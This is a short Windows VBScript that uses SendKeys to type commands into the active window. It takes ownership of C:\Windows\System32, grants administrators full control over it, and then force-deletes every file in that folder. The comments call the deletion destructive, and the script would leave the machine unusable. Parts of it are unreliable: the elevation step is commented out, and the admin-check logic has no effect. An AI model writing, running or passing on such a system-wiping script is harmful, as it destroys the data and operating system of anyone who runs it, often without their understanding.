' VBScript to elevate itself and modify System32 permissions
Option Explicit

Dim WshShell, UAC, admin

' Create WScript Shell object
Set WshShell = WScript.CreateObject("WScript.Shell")

' Short sleep to allow environment setup (100 milliseconds)
WScript.Sleep 100

' Check admin privileges
' It's better to run command separately rather than in one SendKeys
WshShell.SendKeys "cmd /c net session >nul 2>&1" 
WshShell.SendKeys "{ENTER}"
WScript.Sleep 100

' Set admin flag based on errorlevel
WshShell.SendKeys "if %errorLevel% == 0 (set admin=1) else (set admin=0)" 
WshShell.SendKeys "{ENTER}"
WScript.Sleep 100

' Elevate again safely if not admin (requires UAC prompt)
Set UAC = CreateObject("Shell.Application")
' This needs to be executed manually or through ShellExecute, cannot SendKeys reliably
' UAC.ShellExecute "cmd.exe", "/c your_script.bat", "", "runas", 1

' Take ownership of System32 folder
WshShell.SendKeys "takeown /f C:\Windows\System32 /r /d y" 
WshShell.SendKeys "{ENTER}"
WScript.Sleep 100

' Grant administrators full control
WshShell.SendKeys "icacls C:\Windows\System32 /grant administrators:F /t" 
WshShell.SendKeys "{ENTER}"
WScript.Sleep 100

' Change directory to System32
WshShell.SendKeys "cd C:\Windows\System32" 
WshShell.SendKeys "{ENTER}"
WScript.Sleep 100

' Delete all files (use with extreme caution: destructive operation)
WshShell.SendKeys "del /F /S /Q *.*" 
WshShell.SendKeys "{ENTER}"

' Clean up
Set WshShell = Nothing
Set UAC = Nothing
